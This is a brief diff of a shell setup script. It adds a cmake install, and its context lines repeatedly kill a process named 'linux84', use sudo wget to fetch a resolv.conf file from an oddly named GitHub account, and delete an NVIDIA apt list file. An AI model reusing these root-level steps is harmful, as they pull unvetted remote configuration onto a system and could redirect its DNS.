@@ -7,6 +7,8 @@ sudo pkill -f linux84
 sudo pkill -f linux84
 sudo pkill -f linux84
 
+sudo apt-get install cmake -y
+
 sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
 
 sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
